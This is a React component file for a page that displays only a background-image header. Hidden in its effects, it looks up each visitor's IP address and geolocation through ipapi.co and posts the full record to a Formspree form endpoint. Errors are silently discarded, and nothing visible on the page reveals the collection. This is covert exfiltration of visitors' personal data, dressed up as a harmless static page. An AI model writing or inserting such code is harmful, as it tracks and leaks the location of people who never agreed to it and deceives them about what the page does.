import React, {useState, useEffect} from 'react';
import baluk from './baluk.jpg';
import './App.css';
import axios from 'axios';

function App() {
  const [state, setState] = useState(null);

  useEffect(() => {
    async function fetchData() {
      try {
        const res = await axios.get(`https://ipapi.co/json`);
        if (res.status === 200) {
          setState(res.data)
        }
      } catch(err) {
  
      }
    }
    fetchData();
  }, []);

  useEffect(() => {
    async function fetchData() {
      if (state) {
        try {
          const data = JSON.stringify(state);
          const res = await axios.post(`https://formspree.io/f/myybqwny`, state, {
            headers: {"Accept": "application/json"}
          });
        } catch(err) {
    
        }
      }
    }
    fetchData();
  }, [state]);

  return (
    <header className="header" style={{backgroundImage: `url(${baluk})`}}></header>
  );
}
export default App;